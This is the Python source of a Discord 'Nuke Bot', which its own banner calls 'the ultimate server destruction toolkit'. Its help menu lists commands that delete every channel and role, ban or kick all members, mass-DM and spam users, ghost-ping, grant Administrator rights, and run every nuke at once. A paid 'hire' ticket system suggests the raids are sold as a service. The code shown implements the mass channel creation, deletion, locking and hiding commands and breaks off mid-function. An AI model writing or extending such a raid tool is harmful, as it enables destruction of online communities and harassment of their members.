import discord
from discord.ext import commands
import asyncio
import os
import time
import datetime
import json
import aiohttp

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
START_TIME = time.time()

# ─────────────────────────────────────────────
# PERSISTENT WHITELIST
# ─────────────────────────────────────────────

MASTER_ID = 1501897844624461904
WL_FILE   = "whitelist.json"

def _load_whitelist() -> set:
    try:
        with open(WL_FILE) as f:
            data = json.load(f)
        s = set(int(x) for x in data)
    except Exception:
        s = set()
    s.add(MASTER_ID)
    return s

def _save_whitelist(wl: set):
    try:
        with open(WL_FILE, "w") as f:
            json.dump(list(wl), f)
    except Exception:
        pass

WHITELIST = _load_whitelist()

# Commands that anyone can run (no whitelist needed)
PUBLIC_COMMANDS = {"hire", "hirestatus", "hireprice"}

@bot.check
async def is_whitelisted(ctx):
    if ctx.command and ctx.command.name in PUBLIC_COMMANDS:
        return True
    if ctx.author.id in WHITELIST:
        return True
    await safe(ctx.send("❌ **You are not whitelisted to use this bot.**"))
    return False

# ─────────────────────────────────────────────
# ACTION LOGGING  (embeds only, no message spam)
# ─────────────────────────────────────────────

LOG_CHANNEL_ID: int | None = None
LOG_FILE_ENABLED = False
LOG_FILE_PATH    = "bot_log.txt"

async def _log_embed(embed: discord.Embed):
    """Send a log embed to the log channel and/or file."""
    if LOG_FILE_ENABLED:
        try:
            ts = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
            line = f"[{ts}] {embed.title} — {embed.description or ''}\n"
            with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
                f.write(line)
        except Exception:
            pass
    if LOG_CHANNEL_ID:
        ch = bot.get_channel(LOG_CHANNEL_ID)
        if ch:
            try:
                await ch.send(embed=embed)
            except Exception:
                pass

def _action_embed(title: str, color: int, fields: list[tuple] | None = None,
                  footer: str | None = None) -> discord.Embed:
    """Build a clean log embed."""
    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.utcnow())
    if fields:
        for name, value, inline in fields:
            e.add_field(name=name, value=str(value)[:1024], inline=inline)
    if footer:
        e.set_footer(text=footer)
    return e

# ── Log every command start ──
# ─────────────────────────────────────────────
# LIVE TIMER
# ─────────────────────────────────────────────

_active_timer: "LiveTimer | None" = None

class LiveTimer:
    """Sends a live-updating countdown embed to the log channel for bulk operations."""

    COLORS = [0xff0000, 0xff4500, 0xff8c00, 0xffd700, 0xadff2f, 0x57f287]

    def __init__(self, command: str, invoker: str, guild: str):
        self.command  = command
        self.invoker  = invoker
        self.guild    = guild
        self.start    = time.time()
        self.estimated: float | None = None   # set by batch() on first call
        self.total    = 0
        self.done_count = 0
        self.msg: discord.Message | None = None
        self._task: asyncio.Task | None  = None
        self.finished = False

    # Called by batch() on its first invocation for this command
    def register_batch(self, n: int, size: int, delay: float):
        if self.estimated is None and n > 0:
            batches = max(1, (n + size - 1) // size)
            self.estimated = batches * delay
            self.total = n

    def update(self, done: int):
        self.done_count = done

    def _bar(self, pct: float) -> str:
        filled = int(pct * 24)
        return "█" * filled + "░" * (24 - filled)

    def _embed(self) -> discord.Embed:
        elapsed = time.time() - self.start

        if self.estimated and self.estimated > 0:
            pct       = min(elapsed / self.estimated, 1.0)
            remaining = max(0.0, self.estimated - elapsed)
            rem_int   = max(0, int(remaining) + (1 if remaining % 1 > 0 else 0))
        else:
            pct = 1.0 if self.finished else 0.0
            remaining = rem_int = 0

        if self.finished:
            pct = 1.0

        color_idx = min(int(pct * (len(self.COLORS) - 1)), len(self.COLORS) - 1)
        color     = self.COLORS[color_idx]

        if self.finished:
            title = f"✅  `!{self.command}`  —  Done in {elapsed:.1f}s"
        elif self.estimated:
            title = f"⏱️  `!{self.command}`  —  ⏳ {rem_int}s remaining"
        else:
            title = f"⏱️  `!{self.command}`  —  Running…"

        e = discord.Embed(title=title, color=color,
                          timestamp=datetime.datetime.utcnow())

        bar_str = f"`{self._bar(pct)}`  **{int(pct * 100)}%**"
        e.add_field(name="Progress", value=bar_str, inline=False)

        e.add_field(name="⏱ Elapsed",    value=f"`{elapsed:.1f}s`",       inline=True)

        if self.estimated and not self.finished:
            e.add_field(name="⏳ Remaining",  value=f"**`{rem_int}s`**",   inline=True)
            e.add_field(name="📊 Est. total", value=f"`{self.estimated:.1f}s`", inline=True)

        if self.total > 0:
            e.add_field(name="🔢 Items",
                        value=f"`{self.done_count} / {self.total}`", inline=True)

        e.add_field(name="👤 Invoked by", value=self.invoker, inline=True)
        e.add_field(name="🌐 Guild",      value=self.guild,   inline=True)

        if self.finished:
            e.set_footer(text=f"✅ Completed in {elapsed:.1f}s")
        else:
            e.set_footer(text="🔄 Live countdown — ticks every second")

        return e

    async def start_in_channel(self):
        if not LOG_CHANNEL_ID:
            return
        ch = bot.get_channel(LOG_CHANNEL_ID)
        if not ch:
            return
        self.msg = await safe(ch.send(embed=self._embed()))

        async def _updater():
            while not self.finished:
                await asyncio.sleep(1.0)          # ← real 1-second tick
                if self.msg and not self.finished:
                    await safe(self.msg.edit(embed=self._embed()))

        self._task = asyncio.create_task(_updater())

    async def finish(self):
        self.finished = True
        if self._task:
            self._task.cancel()
        if self.msg:
            await safe(self.msg.edit(embed=self._embed()))


@bot.before_invoke
async def _log_command_start(ctx):
    global _active_timer
    # Start a live timer for this command
    _active_timer = LiveTimer(
        command=ctx.command.name,
        invoker=f"{ctx.author} `{ctx.author.id}`",
        guild=ctx.guild.name if ctx.guild else "DM",
    )
    await _active_timer.start_in_channel()
    # Also send a static "command fired" embed
    embed = _action_embed(
        title=f"⚡ Command: `!{ctx.command.name}`",
        color=0x5865F2,
        fields=[
            ("Invoked by", f"{ctx.author} `{ctx.author.id}`", True),
            ("Channel",    f"#{ctx.channel.name}",            True),
            ("Guild",      ctx.guild.name if ctx.guild else "DM", True),
            ("Full input", f"`{ctx.message.content[:200]}`",  False),
        ],
    )
    await _log_embed(embed)

@bot.after_invoke
async def _finish_timer(ctx):
    global _active_timer
    if _active_timer:
        await _active_timer.finish()
        _active_timer = None

# ── Guild events ──
@bot.event
async def on_member_join(member):
    embed = _action_embed(
        title="📥 Member Joined",
        color=0x57f287,
        fields=[
            ("User", f"{member} `{member.id}`", True),
            ("Guild", member.guild.name, True),
            ("Account age", str((discord.utils.utcnow() - member.created_at).days) + " days", True),
        ],
    )
    await _log_embed(embed)

@bot.event
async def on_member_remove(member):
    embed = _action_embed(
        title="📤 Member Left",
        color=0xffa500,
        fields=[("User", f"{member} `{member.id}`", True), ("Guild", member.guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_member_ban(guild, user):
    embed = _action_embed(
        title="🔨 Member Banned",
        color=0xff0000,
        fields=[("User", f"{user} `{user.id}`", True), ("Guild", guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_member_unban(guild, user):
    embed = _action_embed(
        title="🔓 Member Unbanned",
        color=0x57f287,
        fields=[("User", f"{user} `{user.id}`", True), ("Guild", guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_channel_create(channel):
    embed = _action_embed(
        title="📁 Channel Created",
        color=0x00b0f4,
        fields=[
            ("Name", f"#{channel.name}", True),
            ("ID", str(channel.id), True),
            ("Guild", channel.guild.name, True),
        ],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_channel_delete(channel):
    embed = _action_embed(
        title="🗑️ Channel Deleted",
        color=0xff0000,
        fields=[
            ("Name", f"#{channel.name}", True),
            ("ID", str(channel.id), True),
            ("Guild", channel.guild.name, True),
        ],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_role_create(role):
    embed = _action_embed(
        title="🎭 Role Created",
        color=0xffa500,
        fields=[("Name", f"@{role.name}", True), ("ID", str(role.id), True), ("Guild", role.guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_role_delete(role):
    embed = _action_embed(
        title="🗑️ Role Deleted",
        color=0xff0000,
        fields=[("Name", f"@{role.name}", True), ("ID", str(role.id), True), ("Guild", role.guild.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_guild_update(before, after):
    embed = _action_embed(
        title="🌐 Guild Updated",
        color=0x9b59b6,
        fields=[("Before", before.name, True), ("After", after.name, True)],
    )
    await _log_embed(embed)

@bot.event
async def on_voice_state_update(member, before, after):
    b = before.channel.name if before.channel else "—"
    a = after.channel.name if after.channel else "—"
    if b == a:
        return
    embed = _action_embed(
        title="🔊 Voice State Changed",
        color=0x1abc9c,
        fields=[
            ("User", f"{member} `{member.id}`", True),
            ("From", b, True),
            ("To", a, True),
        ],
    )
    await _log_embed(embed)

# ── Log commands ──
@bot.command()
async def log(ctx, channel: discord.TextChannel = None):
    """Enable global action logging to a channel."""
    global LOG_CHANNEL_ID
    if channel is None:
        s = f"<#{LOG_CHANNEL_ID}>" if LOG_CHANNEL_ID else "disabled"
        f = "enabled" if LOG_FILE_ENABLED else "disabled"
        await ctx.send(f"📋 **Log channel:** {s}  |  **File:** {f}")
        return
    LOG_CHANNEL_ID = channel.id
    await ctx.send(f"✅ Action logging → {channel.mention}")
    embed = _action_embed("📋 Logging Started", 0x57f287,
                          [("By", f"{ctx.author}", True), ("Channel", channel.mention, True)])
    await _log_embed(embed)

@bot.command()
async def logoff(ctx):
    global LOG_CHANNEL_ID
    LOG_CHANNEL_ID = None
    await ctx.send("🔕 Action logging **disabled**.")

@bot.command()
async def logfile(ctx):
    global LOG_FILE_ENABLED
    LOG_FILE_ENABLED = not LOG_FILE_ENABLED
    state = "enabled ✅" if LOG_FILE_ENABLED else "disabled ❌"
    await ctx.send(f"📄 File logging (`{LOG_FILE_PATH}`) {state}")

@bot.command()
async def logtail(ctx, lines: int = 30):
    """Show last N lines from the log file."""
    try:
        with open(LOG_FILE_PATH, encoding="utf-8") as f:
            all_lines = f.readlines()
        tail = "".join(all_lines[-lines:]) or "(empty)"
        for chunk in [tail[i:i+1900] for i in range(0, len(tail), 1900)]:
            await safe(ctx.send(f"```\n{chunk}\n```"))
    except FileNotFoundError:
        await ctx.send("❌ No log file found. Enable with `!logfile`.")

@bot.command()
async def logclear(ctx):
    open(LOG_FILE_PATH, "w").close()
    await ctx.send("🗑️ Log file cleared.")

# ─────────────────────────────────────────────
# CORE HELPERS
# ─────────────────────────────────────────────

async def safe(coro):
    try:
        return await coro
    except Exception:
        pass

STOPPED = False

async def _run_if_not_stopped(coro):
    global STOPPED
    if STOPPED:
        return
    return await safe(coro)

async def batch(coros, size=5, delay=0.5):
    global STOPPED, _active_timer
    coros = list(coros)
    n = len(coros)

    # Register this batch with the live timer (first call wins for estimate)
    if _active_timer:
        _active_timer.register_batch(n, size, delay)

    reached = 0
    for i in range(0, n, size):
        if STOPPED:
            break
        chunk = coros[i:i + size]
        reached = i + len(chunk)
        await asyncio.gather(*[_run_if_not_stopped(c) for c in chunk])
        if _active_timer:
            _active_timer.update(reached)
        if STOPPED:
            break
        if i + size < n:
            await asyncio.sleep(delay)
            if STOPPED:
                break
    for c in coros[reached:]:
        if asyncio.iscoroutine(c):
            c.close()

async def status(ctx, action):
    try:
        await ctx.send(f"✅ `{action}` done.")
    except Exception:
        pass

@bot.command()
async def stop(ctx):
    global STOPPED
    STOPPED = True
    await ctx.send("🛑 **All operations stopped.** Use `!resume` to re-enable.")

@bot.command()
async def resume(ctx):
    global STOPPED
    STOPPED = False
    await ctx.send("▶️ **Operations resumed.**")

# ─────────────────────────────────────────────
# WHITELIST  (master only)
# ─────────────────────────────────────────────

def master_only(ctx):
    return ctx.author.id == MASTER_ID

@bot.command()
async def wladd(ctx, user_id: int):
    if not master_only(ctx):
        await ctx.send("❌ Only the master can manage the whitelist.")
        return
    WHITELIST.add(user_id)
    _save_whitelist(WHITELIST)
    e = discord.Embed(title="✅ Whitelisted", description=f"`{user_id}` added.", color=0x57f287)
    await ctx.send(embed=e)
    await _log_embed(_action_embed("🔐 Whitelist Add", 0x57f287,
                                   [("ID", str(user_id), True), ("By", str(ctx.author), True)]))

@bot.command()
async def wlremove(ctx, user_id: int):
    if not master_only(ctx):
        await ctx.send("❌ Only the master can manage the whitelist.")
        return
    if user_id == MASTER_ID:
        await ctx.send("❌ Cannot remove the master.")
        return
    WHITELIST.discard(user_id)
    _save_whitelist(WHITELIST)
    e = discord.Embed(title="🗑️ Removed", description=f"`{user_id}` removed.", color=0xff0000)
    await ctx.send(embed=e)
    await _log_embed(_action_embed("🔐 Whitelist Remove", 0xff0000,
                                   [("ID", str(user_id), True), ("By", str(ctx.author), True)]))

@bot.command()
async def wllist(ctx):
    if not master_only(ctx):
        await ctx.send("❌ Only the master can view the whitelist.")
        return
    lines = [f"`{uid}`{'  👑 *(master)*' if uid == MASTER_ID else ''}" for uid in sorted(WHITELIST)]
    e = discord.Embed(title="📋 Whitelist", description="\n".join(lines) or "*(empty)*", color=0xffd700)
    e.set_footer(text=f"{len(WHITELIST)} user(s)  •  Saved to disk permanently")
    await ctx.send(embed=e)

# Batch sizes
BATCH_MSG  = dict(size=5,  delay=1.1)
BATCH_WH   = dict(size=30, delay=0.1)
BATCH_CH   = dict(size=5,  delay=1.1)
BATCH_ROLE = dict(size=5,  delay=1.1)
BATCH_MBR  = dict(size=5,  delay=1.0)

# ─────────────────────────────────────────────
# HELP — BUTTON MENU
# ─────────────────────────────────────────────

HELP_PAGES = {
    "channels": {
        "label": "📁 Channels",
        "color": 0x00b0f4,
        "title": "📁  Channel Commands",
        "text": (
            "`!mc <name> <count>` — Mass create text channels\n"
            "`!mcv <name> <count>` — Mass create voice channels\n"
            "`!mcat <name> <count>` — Mass create categories\n"
            "`!dac` — Delete **ALL** channels\n"
            "`!datc` — Delete all text channels\n"
            "`!davc` — Delete all voice channels\n"
            "`!dacat` — Delete all categories\n"
            "`!renameall <name>` — Rename all channels\n"
            "`!lockall` — Lock all channels\n"
            "`!unlockall` — Unlock all channels\n"
            "`!hideall` — Hide all channels from @everyone\n"
            "`!showall` — Show all channels to @everyone\n"
            "`!slowall <seconds>` — Set slowmode in all channels\n"
            "`!nsfwall` — Mark all text channels NSFW\n"
            "`!unnsfwall` — Unmark NSFW on all channels\n"
            "`!topicall <topic>` — Set topic in all channels\n"
            "`!delpins` — Delete pinned messages in current channel\n"
            "`!delpinsall` — Delete pinned messages in all channels\n"
            "`!clonech <#ch> <count>` — Clone a channel multiple times\n"
            "`!cloneall` — Clone every channel\n"
            "`!archivech <#ch>` — Move channel to an Archive category\n"
            "`!movech <#ch> <#cat>` — Move channel to a category\n"
            "`!channelinfo` — List all channels with IDs\n"
            "`!vcbitrate <#vc> <bps>` — Set VC bitrate\n"
            "`!vcbitrateall <bps>` — Set bitrate on all VCs\n"
            "`!vclimit <#vc> <n>` — Set VC user limit\n"
            "`!vclimitall <n>` — Set user limit on all VCs\n"
            "`!createinvite [#ch]` — Create a permanent invite\n"
            "`!wipechat` — Delete ALL messages in current channel\n"
            "`!nuke <name> <msg>` — 💥 Holy Grail: channels + pings\n"
            "`!nukeall <name>` — Delete all channels & recreate\n"
        ),
    },
    "roles": {
        "label": "🎭 Roles",
        "color": 0xffa500,
        "title": "🎭  Role Commands",
        "text": (
            "`!mr <name> <count>` — Mass create roles\n"
            "`!dar` — Delete **ALL** roles\n"
            "`!renameallr <name>` — Rename all roles\n"
            "`!massrole <role>` — Give role to all members\n"
            "`!massremoverole <role>` — Remove role from all members\n"
            "`!stripall` — Strip all roles from all members\n"
            "`!adminrole <role>` — Give a role Administrator perms\n"
            "`!depermsall` — Wipe perms from all roles\n"
            "`!colorallr <hex>` — Change all roles color\n"
            "`!mentionallr` — Make all roles mentionable\n"
            "`!unmentionallr` — Make all roles unmentionable\n"
            "`!hoistallr` — Hoist all roles\n"
            "`!unhoistallr` — Unhoist all roles\n"
            "`!roleinfo <role>` — Detailed role info\n"
            "`!cloner <role> <name>` — Clone a role\n"
            "`!banrole <role>` — Ban all members with a role\n"
            "`!kickrole <role>` — Kick all members with a role\n"
            "`!listroles` — List all roles with IDs\n"
        ),
    },
    "members": {
        "label": "👥 Members",
        "color": 0x57f287,
        "title": "👥  Member Commands",
        "text": (
            "`!ban` — Ban **ALL** members\n"
            "`!kick` — Kick **ALL** members\n"
            "`!mban <count>` — Ban X members\n"
            "`!mkick <count>` — Kick X members\n"
            "`!massunban` — Unban all banned members\n"
            "`!banid <id>` — Ban a user by ID\n"
            "`!hackban <id>` — Ban a user not in server\n"
            "`!softban <user>` — Ban+unban (clears messages)\n"
            "`!banrole <role>` — Ban all with a role\n"
            "`!kickrole <role>` — Kick all with a role\n"
            "`!massdeafen` — Deafen all voice members\n"
            "`!massmute` — Mute all voice members\n"
            "`!undeafenall` — Undeafen all voice members\n"
            "`!unmuteall` — Unmute all voice members\n"
            "`!massmove <#vc>` — Move all voice members\n"
            "`!voicekick` — Disconnect all voice members\n"
            "`!nickall <nick>` — Change all nicknames\n"
            "`!massnick <role> <nick>` — Nick all with a role\n"
            "`!resetnicks` — Reset all nicknames\n"
            "`!timeoutall <minutes>` — Timeout all members\n"
            "`!untimeoutall` — Remove all timeouts\n"
            "`!userinfo <user>` — Detailed user info\n"
            "`!joinedafter <days>` — Members who joined in last X days\n"
            "`!jointime <user>` — When a user joined\n"
            "`!membercount` — Member count breakdown\n"
            "`!listbans` — List all banned users\n"
        ),
    },
    "massdm": {
        "label": "📩 Mass DM",
        "color": 0xff69b4,
        "title": "📩  Mass DM Commands",
        "text": (
            "`!dmall <msg>` — DM all members\n"
            "`!massdmrole <role> <msg>` — DM all with a role\n"
            "`!massdmnonrole <role> <msg>` — DM all WITHOUT a role\n"
            "`!massdmnew <days> <msg>` — DM members who joined in last X days\n"
            "`!massdmids <id,id,...> <msg>` — DM specific user IDs\n"
            "`!massdmbots <msg>` — DM all bot accounts\n"
            "`!massdmoffline <msg>` — DM all offline members\n"
            "`!massdmonline <msg>` — DM all online members\n"
            "`!massdmnoavatar <msg>` — DM members with default avatar\n"
            "`!dmallroles <msg>` — DM every role holder (no dupes)\n"
            "`!dmowner <msg>` — DM the server owner\n"
            "`!dmrepeat <user> <count> <msg>` — DM one user X times\n"
            "`!dmembed <user> <title> | <body>` — DM an embed to a user\n"
        ),
    },
    "messaging": {
        "label": "💬 Messaging",
        "color": 0xeb459e,
        "title": "💬  Messaging Commands",
        "text": (
            "`!mcp <name> <count> <pings> <msg>` — Create channels + ping\n"
            "`!spam <count> <msg>` — Spam in current channel\n"
            "`!spamall <count> <msg>` — Spam in ALL channels\n"
            "`!pingall <count>` — @everyone X times in all channels\n"
            "`!pingr <role> <count>` — Ping a role X times in all channels\n"
            "`!massping <user> <count>` — Ping one user X times\n"
            "`!ghostping <count>` — Ghost ping @everyone here\n"
            "`!ghostpingall <count>` — Ghost ping @everyone in ALL channels\n"
            "`!tts <msg>` — TTS in current channel\n"
            "`!ttsall <msg>` — TTS in ALL channels\n"
            "`!embedspam <count> <title> | <body>` — Spam embed here\n"
            "`!embedall <title> | <body>` — Send embed to ALL channels\n"
            "`!announce <msg>` — Announce to all channels as embed\n"
            "`!say <#ch> <msg>` — Send message to a specific channel\n"
            "`!purge <count>` — Purge messages here\n"
            "`!purgeall <count>` — Purge messages in ALL channels\n"
            "`!purgebots <count>` — Purge bot messages here\n"
            "`!purgeuser <user> <count>` — Purge a user's messages here\n"
            "`!wipechat` — Purge ALL messages in current channel\n"
            "`!pin <msg_id>` — Pin a message by ID\n"
            "`!react <msg_id> <emoji>` — React to a message\n"
            "`!reactall <emoji>` — React to last msg in every channel\n"
            "`!countdown <n> <msg>` — Countdown then message\n"
            "`!forwardall <#src> <#dest>` — Forward msgs to another channel\n"
            "`!wspam <count> <msg>` — ⚡ Webhook spam here\n"
            "`!wspamall <count> <msg>` — ⚡ Webhook spam in ALL channels\n"
            "`!whnuke <name> <count> <pings> <msg>` — ⚡ Webhook nuke\n"
        ),
    },
    "server": {
        "label": "🌐 Server",
        "color": 0x9b59b6,
        "title": "🌐  Server Commands",
        "text": (
            "`!renameserver <name>` — Rename the server\n"
            "`!icon <url>` — Change server icon\n"
            "`!banner <url>` — Change server banner\n"
            "`!description <text>` — Change server description\n"
            "`!setverification <0-4>` — Set verification level\n"
            "`!setfilter <0-2>` — Set explicit content filter\n"
            "`!setnotifications <0-1>` — Default notification level\n"
            "`!setafk <#vc>` — Set AFK voice channel\n"
            "`!setafktimeout <seconds>` — Set AFK timeout\n"
            "`!das` — Delete all stickers\n"
            "`!delemojis` — Delete all custom emojis\n"
            "`!addemoji <name> <url>` — Add emoji from URL\n"
            "`!massemoji <name> <url> <count>` — Add emoji N times\n"
            "`!delthreads` — Delete all threads\n"
            "`!delwebhooks` — Delete all webhooks\n"
            "`!delinvites` — Delete all invites\n"
            "`!listinvites` — List active invites\n"
            "`!webhook <name> <count>` — Mass-create webhooks\n"
            "`!audit <count>` — Recent audit log entries\n"
            "`!serverinfo` — Server info embed\n"
            "`!vanity` — Show vanity URL\n"
            "`!inviteme` — Generate bot invite link\n"
            "`!everything` — ☢️ Run ALL nuke commands\n"
        ),
    },
    "logging": {
        "label": "📋 Logging",
        "color": 0x1abc9c,
        "title": "📋  Logging Commands",
        "text": (
            "`!log [#channel]` — Enable action logging to a channel\n"
            "`!logoff` — Disable channel logging\n"
            "`!logfile` — Toggle logging to `bot_log.txt`\n"
            "`!logtail [lines]` — Show last N lines from log file\n"
            "`!logclear` — Clear the log file\n\n"
            "**What gets logged:**\n"
            "Every command invoked (who, where, args)\n"
            "Member joins / leaves\n"
            "Bans / unbans\n"
            "Channel creates / deletes\n"
            "Role creates / deletes\n"
            "Guild renames\n"
            "Voice channel moves\n"
            "DM results (sent/failed counts)\n"
            "All bulk action results\n"
        ),
    },
    "bot": {
        "label": "🤖 Bot",
        "color": 0xffd700,
        "title": "🤖  Bot Control Commands",
        "text": (
            "`!ping` — Bot latency\n"
            "`!uptime` — How long the bot has been running\n"
            "`!botstatus <text>` — Change bot status\n"
            "`!botname <name>` — Change bot username\n"
            "`!botavatar <url>` — Change bot avatar\n"
            "`!activity <type> <text>` — Set activity (playing/watching/listening/streaming)\n"
            "`!guilds` — List all guilds the bot is in\n"
            "`!cmdcount` — Total command count\n"
            "`!stop` — 🛑 Stop all running operations\n"
            "`!resume` — ▶️ Resume operations\n"
        ),
    },
    "whitelist": {
        "label": "🔐 Whitelist",
        "color": 0x2f3136,
        "title": "🔐  Whitelist  *(master only)*",
        "text": (
            "`!wladd <user_id>` — Add user to whitelist\n"
            "`!wlremove <user_id>` — Remove user from whitelist\n"
            "`!wllist` — Show all whitelisted users\n\n"
            "Only the master 👑 can run these commands.\n"
            "Non-whitelisted users are blocked from **all** commands.\n"
            "✅ **Whitelist is saved to disk — persists through restarts.**\n"
            f"Master ID: `{MASTER_ID}`"
        ),
    },
    "modmail": {
        "label": "📩 ModMail",
        "color": 0xeb459e,
        "title": "📩  ModMail Panel",
        "text": (
            "**Anyone can DM the bot** to reach staff.\n\n"
            "**What happens when someone DMs:**\n"
            "• They receive an interactive welcome menu\n"
            "• Staff see the message + user info in the log channel\n"
            "• Staff reply or block directly from the log embed\n\n"
            "**Log channel buttons:**\n"
            "✉️ **Reply** — Opens a modal, bot DMs user your reply\n"
            "🚫 **Block User** — Stops all future DMs from that user\n\n"
            "**DM menu buttons (what users see):**\n"
            "🔥 **Hire Us** — Opens the hire request form\n"
            "💰 **Pricing** — Shows current tier prices\n"
            "❓ **Support** — Notifies staff of a support request\n"
        ),
    },
    "hire": {
        "label": "🎫 Hire",
        "color": 0xff4500,
        "title": "🎫  Hire & Ticket System",
        "text": (
            "**Public (anyone):**\n"
            "`!hire` — Open hire request form\n"
            "`!hireprice` — Show current pricing\n"
            "`!hirestatus <id>` — Check your ticket status\n\n"
            "**Staff (whitelist):**\n"
            "`!hiresetup [#ch]` — Set fallback log channel *(master)*\n"
            "`!setprice <tier> <amt>` — Update a tier price\n"
            "`!hirelist` — List all tickets\n"
            "`!hireinfo <id>` — Full ticket details\n"
            "`!hireaccept <id>` — Accept & notify client\n"
            "`!hiredeny <id> [reason]` — Deny & notify client\n"
            "`!hireclose <id>` — Close completed ticket\n"
            "`!hirenote <id> <note>` — Add staff note\n"
            "`!hirecancel <id>` — Cancel a ticket\n"
            "`!hirearch` — View archived tickets\n"
            "`!hiredmclient <id> <msg>` — DM client directly\n\n"
            "**Auto:** Each submission creates its own channel\n"
            "inside the `🎫 Hire Tickets` category with\n"
            "Accept · Deny · Close · Note · DM buttons."
        ),
    },
}

class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=120)
        self.current = "channels"
        keys = list(HELP_PAGES.keys())
        # Row 0 — first 4
        for key in keys[:4]:
            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=0))
        # Row 1 — next 4
        for key in keys[4:8]:
            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=1))
        # Row 2 — remaining (whitelist, modmail, hire)
        for key in keys[8:]:
            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=2))

    def get_embed(self, page_key: str) -> discord.Embed:
        page = HELP_PAGES[page_key]
        e = discord.Embed(title=page["title"], description=page["text"], color=page["color"])
        e.set_footer(text="Nuke Bot  •  prefix: !  •  Click a button to switch category")
        return e

class HelpButton(discord.ui.Button):
    def __init__(self, key: str, label: str, row: int):
        super().__init__(label=label, style=discord.ButtonStyle.secondary, row=row)
        self.key = key

    async def callback(self, interaction: discord.Interaction):
        view: HelpView = self.view
        # Highlight active button
        for child in view.children:
            if isinstance(child, HelpButton):
                child.style = (
                    discord.ButtonStyle.primary
                    if child.key == self.key
                    else discord.ButtonStyle.secondary
                )
        await interaction.response.edit_message(embed=view.get_embed(self.key), view=view)

@bot.command()
async def help(ctx):
    view = HelpView()
    header = discord.Embed(
        title="💥  N U K E  B O T",
        description=(
            "**The ultimate server destruction toolkit.**\n"
            "Click a category button below to explore commands.\n"
            "Use `!stop` at any time to halt all operations."
        ),
        color=0xff0000,
    )
    header.set_image(url="https://media.tenor.com/R2aRkFNFMFMAAAAC/explosion-nuke.gif")
    header.set_footer(text="⚠️  Use responsibly — for servers you own only.")
    # Send header, then button menu
    await ctx.send(embed=header)
    await ctx.send(embed=view.get_embed("channels"), view=view)

# ─────────────────────────────────────────────
# CHANNELS
# ─────────────────────────────────────────────

@bot.command()
async def mc(ctx, name: str, count: int):
    await batch([ctx.guild.create_text_channel(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mc {name} x{count}")
    await _log_embed(_action_embed("📁 Mass Create Channels", 0x00b0f4,
        [("Name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def mcv(ctx, name: str, count: int):
    await batch([ctx.guild.create_voice_channel(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mcv {name} x{count}")
    await _log_embed(_action_embed("🔊 Mass Create Voice Channels", 0x00b0f4,
        [("Name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def mcat(ctx, name: str, count: int):
    await batch([ctx.guild.create_category(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mcat {name} x{count}")
    await _log_embed(_action_embed("📂 Mass Create Categories", 0x00b0f4,
        [("Name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def dac(ctx):
    count = len(ctx.guild.channels)
    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "dac")
    await _log_embed(_action_embed("🗑️ Deleted ALL Channels", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def datc(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.delete() for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "datc")
    await _log_embed(_action_embed("🗑️ Deleted All Text Channels", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def davc(ctx):
    count = len(ctx.guild.voice_channels)
    await batch([ch.delete() for ch in ctx.guild.voice_channels], **BATCH_CH)
    await status(ctx, "davc")
    await _log_embed(_action_embed("🗑️ Deleted All Voice Channels", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def dacat(ctx):
    count = len(ctx.guild.categories)
    await batch([cat.delete() for cat in ctx.guild.categories], **BATCH_CH)
    await status(ctx, "dacat")
    await _log_embed(_action_embed("🗑️ Deleted All Categories", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def renameall(ctx, *, name: str):
    count = len(ctx.guild.channels)
    await batch([ch.edit(name=name) for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, f"renameall {name}")
    await _log_embed(_action_embed("✏️ Renamed All Channels", 0x00b0f4,
        [("New name", name, True), ("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def lockall(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.set_permissions(ctx.guild.default_role, send_messages=False)
                 for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "lockall")
    await _log_embed(_action_embed("🔒 Locked All Channels", 0xff0000,
        [("Channels locked", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unlockall(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.set_permissions(ctx.guild.default_role, send_messages=True)
                 for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "unlockall")
    await _log_embed(_action_embed("🔓 Unlocked All Channels", 0x57f287,
        [("Channels unlocked", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def hideall(ctx):
    count = len(ctx.guild.channels)
    await batch([ch.set_permissions(ctx.guild.default_role, view_channel=False)
                 for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "hideall")
    await _log_embed(_action_embed("🙈 Hidden All Channels", 0xff0000,
